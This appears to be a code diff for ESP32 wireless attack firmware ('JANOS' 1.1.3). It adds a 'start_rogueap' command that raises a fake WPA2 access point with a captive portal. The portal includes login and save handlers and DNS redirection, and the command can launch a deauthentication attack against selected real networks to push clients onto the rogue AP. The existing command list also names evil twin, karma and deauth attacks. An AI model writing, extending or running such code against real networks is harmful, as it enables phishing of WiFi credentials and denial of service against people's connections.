@@ -93,7 +93,7 @@
 #endif
 
 //Version number
-#define JANOS_VERSION "1.1.2"
+#define JANOS_VERSION "1.1.3"
 
 
 #define NEOPIXEL_GPIO      27
@@ -875,6 +875,7 @@ static int cmd_start_blackout(int argc, char **argv);
 static int cmd_ping(int argc, char **argv);
 static int cmd_boot_button(int argc, char **argv);
 static int cmd_start_portal(int argc, char **argv);
+static int cmd_start_rogueap(int argc, char **argv);
 static int cmd_start_karma(int argc, char **argv);
 static int cmd_list_sd(int argc, char **argv);
 static int cmd_list_dir(int argc, char **argv);
@@ -7688,6 +7689,343 @@ static int cmd_start_portal(int argc, char **argv) {
     return 0;
 }
 
+// Start password-protected rogue AP with captive portal and optional deauth
+static int cmd_start_rogueap(int argc, char **argv) {
+    log_memory_info("start_rogueap");
+    
+    // Validate arguments
+    if (argc < 3) {
+        MY_LOG_INFO(TAG, "Usage: start_rogueap <SSID> <password>");
+        MY_LOG_INFO(TAG, "Example: start_rogueap MyNetwork MyPassword123");
+        return 1;
+    }
+    
+    const char *ssid = argv[1];
+    const char *password = argv[2];
+    size_t ssid_len = strlen(ssid);
+    size_t password_len = strlen(password);
+    
+    // Validate SSID length (WiFi SSID max is 32 characters)
+    if (ssid_len == 0 || ssid_len > 32) {
+        MY_LOG_INFO(TAG, "SSID length must be between 1 and 32 characters");
+        return 1;
+    }
+    
+    // Validate password length (WPA2 requires 8-63 characters)
+    if (password_len < 8 || password_len > 63) {
+        MY_LOG_INFO(TAG, "Password length must be between 8 and 63 characters for WPA2");
+        return 1;
+    }
+    
+    // Check if custom HTML is selected via select_html
+    if (custom_portal_html == NULL) {
+        MY_LOG_INFO(TAG, "No custom HTML selected. Use 'select_html' command first.");
+        MY_LOG_INFO(TAG, "Example: list_html, then select_html <number>");
+        return 1;
+    }
+    
+    // Check if portal is already running
+    if (portal_active) {
+        MY_LOG_INFO(TAG, "Portal already running. Use 'stop' to stop it first.");
+        return 1;
+    }
+    
+    // Check if deauth attack is already running
+    if (deauth_attack_active || deauth_attack_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "Deauth attack already running. Use 'stop' to stop it first.");
+        return 1;
+    }
+    
+    // Ensure WiFi is initialized
+    if (!ensure_wifi_mode()) {
+        MY_LOG_INFO(TAG, "Failed to initialize WiFi");
+        return 1;
+    }
+    
+    // Reset stop flag
+    operation_stop_requested = false;
+    
+    MY_LOG_INFO(TAG, "Starting Rogue AP with SSID: %s (WPA2 protected)", ssid);
+    
+    // If networks are selected, prepare for deauth
+    bool deauth_enabled = (g_selected_count > 0);
+    if (deauth_enabled) {
+        MY_LOG_INFO(TAG, "Networks selected: %d - deauth attack will run alongside portal", g_selected_count);
+        applicationState = DEAUTH_EVIL_TWIN;  // Same state as evil twin for channel parking
+    } else {
+        MY_LOG_INFO(TAG, "No networks selected - portal only mode (no deauth)");
+        // Keep IDLE state - portal_active flag handles the portal functionality
+    }
+    
+    // Store portal SSID for logging purposes
+    if (portalSSID != NULL) {
+        free(portalSSID);
+    }
+    portalSSID = malloc(ssid_len + 1);
+    if (portalSSID != NULL) {
+        strcpy(portalSSID, ssid);
+    }
+    
+    // Enable AP mode and get AP netif
+    esp_netif_t *ap_netif = ensure_ap_mode();
+    if (!ap_netif) {
+        MY_LOG_INFO(TAG, "Failed to enable AP mode");
+        applicationState = IDLE;
+        return 1;
+    }
+    
+    // Stop DHCP server to configure custom IP
+    esp_netif_dhcps_stop(ap_netif);
+    
+    // Set static IP 172.0.0.1 for AP
+    esp_netif_ip_info_t ip_info;
+    ip_info.ip.addr = esp_ip4addr_aton("172.0.0.1");
+    ip_info.gw.addr = esp_ip4addr_aton("172.0.0.1");
+    ip_info.netmask.addr = esp_ip4addr_aton("255.255.255.0");
+    
+    esp_err_t ret = esp_netif_set_ip_info(ap_netif, &ip_info);
+    if (ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to set AP IP: %s", esp_err_to_name(ret));
+        applicationState = IDLE;
+        return 1;
+    }
+    
+    MY_LOG_INFO(TAG, "AP IP set to 172.0.0.1");
+    
+    // Configure AP with WPA2-PSK authentication
+    wifi_config_t ap_config = {0};
+    memcpy(ap_config.ap.ssid, ssid, ssid_len);
+    ap_config.ap.ssid_len = ssid_len;
+    strncpy((char*)ap_config.ap.password, password, sizeof(ap_config.ap.password) - 1);
+    ap_config.ap.max_connection = 4;
+    ap_config.ap.authmode = WIFI_AUTH_WPA2_PSK;
+    
+    // Use first selected network's channel if available, otherwise channel 1
+    if (deauth_enabled && target_bssid_count > 0) {
+        ap_config.ap.channel = target_bssids[0].channel;
+        MY_LOG_INFO(TAG, "Using channel %d from first selected network", ap_config.ap.channel);
+    } else if (deauth_enabled && g_selected_count > 0) {
+        // target_bssids not yet saved, get from scan results
+        int idx = g_selected_indices[0];
+        ap_config.ap.channel = g_scan_results[idx].primary;
+        MY_LOG_INFO(TAG, "Using channel %d from first selected network", ap_config.ap.channel);
+    } else {
+        ap_config.ap.channel = 1;
+    }
+    
+    // AP mode already enabled by ensure_ap_mode(), just configure it
+    ret = esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+    if (ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to set AP config: %s", esp_err_to_name(ret));
+        applicationState = IDLE;
+        return 1;
+    }
+    
+    // Start DHCP server
+    ret = esp_netif_dhcps_start(ap_netif);
+    if (ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to start DHCP server: %s", esp_err_to_name(ret));
+        applicationState = IDLE;
+        return 1;
+    }
+    
+    // Wait a bit for AP to fully start
+    vTaskDelay(pdMS_TO_TICKS(1000));
+    
+    // Configure HTTP server
+    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
+    config.server_port = 80;
+    config.max_open_sockets = 7;
+    
+    // Start HTTP server
+    esp_err_t http_ret = httpd_start(&portal_server, &config);
+    if (http_ret != ESP_OK) {
+        MY_LOG_INFO(TAG, "Failed to start HTTP server: %s", esp_err_to_name(http_ret));
+        esp_netif_dhcps_stop(ap_netif);
+        applicationState = IDLE;
+        return 1;
+    }
+    
+    MY_LOG_INFO(TAG, "HTTP server started successfully on port 80");
+    
+    // Register URI handlers (same as start_portal)
+    httpd_uri_t root_uri = {
+        .uri = "/",
+        .method = HTTP_GET,
+        .handler = root_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &root_uri);
+    
+    httpd_uri_t root_post_uri = {
+        .uri = "/",
+        .method = HTTP_POST,
+        .handler = root_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &root_post_uri);
+    
+    httpd_uri_t portal_uri = {
+        .uri = "/portal",
+        .method = HTTP_GET,
+        .handler = portal_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &portal_uri);
+    
+    httpd_uri_t login_uri = {
+        .uri = "/login",
+        .method = HTTP_POST,
+        .handler = login_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &login_uri);
+    
+    httpd_uri_t get_uri = {
+        .uri = "/get",
+        .method = HTTP_GET,
+        .handler = get_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &get_uri);
+    
+    httpd_uri_t save_uri = {
+        .uri = "/save",
+        .method = HTTP_POST,
+        .handler = save_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &save_uri);
+    
+    httpd_uri_t android_captive_uri = {
+        .uri = "/generate_204",
+        .method = HTTP_GET,
+        .handler = android_captive_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &android_captive_uri);
+    
+    httpd_uri_t ios_captive_uri = {
+        .uri = "/hotspot-detect.html",
+        .method = HTTP_GET,
+        .handler = ios_captive_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &ios_captive_uri);
+    
+    httpd_uri_t samsung_captive_uri = {
+        .uri = "/ncsi.txt",
+        .method = HTTP_GET,
+        .handler = captive_detection_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &samsung_captive_uri);
+    
+    httpd_uri_t captive_uri = {
+        .uri = "/*",
+        .method = HTTP_GET,
+        .handler = captive_portal_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &captive_uri);
+    
+    httpd_uri_t captive_api_uri = {
+        .uri = "/captive-portal/api",
+        .method = HTTP_GET,
+        .handler = captive_api_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &captive_api_uri);
+    
+    httpd_uri_t captive_api_post_uri = {
+        .uri = "/captive-portal/api",
+        .method = HTTP_POST,
+        .handler = captive_api_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &captive_api_post_uri);
+    
+    httpd_uri_t captive_api_options_uri = {
+        .uri = "/captive-portal/api",
+        .method = HTTP_OPTIONS,
+        .handler = captive_api_handler,
+        .user_ctx = NULL
+    };
+    httpd_register_uri_handler(portal_server, &captive_api_options_uri);
+    
+    // Set portal as active (must be before starting DNS task)
+    portal_active = true;
+    MY_LOG_INFO(TAG, "Portal marked as active");
+    
+    // Start DNS server task
+    BaseType_t task_ret = xTaskCreate(
+        dns_server_task,
+        "dns_server",
+        4096,
+        NULL,
+        5,
+        &dns_server_task_handle
+    );
+    
+    if (task_ret != pdPASS) {
+        MY_LOG_INFO(TAG, "Failed to create DNS server task");
+        portal_active = false;
+        httpd_stop(portal_server);
+        portal_server = NULL;
+        esp_netif_dhcps_stop(ap_netif);
+        applicationState = IDLE;
+        return 1;
+    }
+    
+    // If networks are selected, start deauth attack
+    if (deauth_enabled) {
+        // Save target BSSIDs for channel monitoring
+        save_target_bssids();
+        last_channel_check_time = esp_timer_get_time() / 1000; // Convert to milliseconds
+        
+        MY_LOG_INFO(TAG, "Starting deauth attack on %d network(s):", g_selected_count);
+        for (int i = 0; i < target_bssid_count; i++) {
+            MY_LOG_INFO(TAG, "  [%d] %02X:%02X:%02X:%02X:%02X:%02X (CH %d)",
+                        i + 1,
+                        target_bssids[i].bssid[0], target_bssids[i].bssid[1],
+                        target_bssids[i].bssid[2], target_bssids[i].bssid[3],
+                        target_bssids[i].bssid[4], target_bssids[i].bssid[5],
+                        target_bssids[i].channel);
+        }
+        
+        // Start deauth attack in background task
+        deauth_attack_active = true;
+        BaseType_t result = xTaskCreate(
+            deauth_attack_task,
+            "deauth_task",
+            4096,
+            NULL,
+            5,
+            &deauth_attack_task_handle
+        );
+        
+        if (result != pdPASS) {
+            MY_LOG_INFO(TAG, "Failed to create deauth attack task!");
+            deauth_attack_active = false;
+            // Portal is still running, so don't fail completely
+            MY_LOG_INFO(TAG, "WARNING: Portal running but deauth attack failed to start");
+        }
+    }
+    
+    MY_LOG_INFO(TAG, "Rogue AP started successfully!");
+    MY_LOG_INFO(TAG, "AP Name: %s (WPA2 protected)", ssid);
+    MY_LOG_INFO(TAG, "Password: %s", password);
+    MY_LOG_INFO(TAG, "Custom HTML loaded (%zu bytes)", strlen(custom_portal_html));
+    MY_LOG_INFO(TAG, "Connect to '%s' WiFi network to access the captive portal", ssid);
+    
+    esp_err_t led_err = led_set_color(255, 165, 0); // Orange for rogue AP mode
+    if (led_err != ESP_OK) {
+        ESP_LOGW(TAG, "Failed to set LED for rogue AP mode: %s", esp_err_to_name(led_err));
+    }
+    
+    return 0;
+}
+
 // ============================================================================
 // BLE Scanner Functions (NimBLE)
 // ============================================================================
@@ -8665,6 +9003,15 @@ static void register_commands(void)
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&portal_cmd));
 
+    const esp_console_cmd_t rogueap_cmd = {
+        .command = "start_rogueap",
+        .help = "Start WPA2 rogue AP with captive portal: start_rogueap <SSID> <password>. Requires select_html first. Runs deauth if networks selected.",
+        .hint = "<SSID> <password>",
+        .func = &cmd_start_rogueap,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&rogueap_cmd));
+
     const esp_console_cmd_t karma_cmd = {
         .command = "start_karma",
         .help = "Starts Karma attack with SSID from probe list: start_karma <index>",
@@ -9017,6 +9364,7 @@ void app_main(void) {
       MY_LOG_INFO(TAG,"  start_deauth");
       MY_LOG_INFO(TAG,"  start_evil_twin");
       MY_LOG_INFO(TAG,"  start_portal <SSID>");
+      MY_LOG_INFO(TAG,"  start_rogueap <SSID> <password>");
       MY_LOG_INFO(TAG,"  start_sniffer");
       MY_LOG_INFO(TAG,"  start_sniffer_noscan");
       MY_LOG_INFO(TAG,"  start_sniffer_dog");
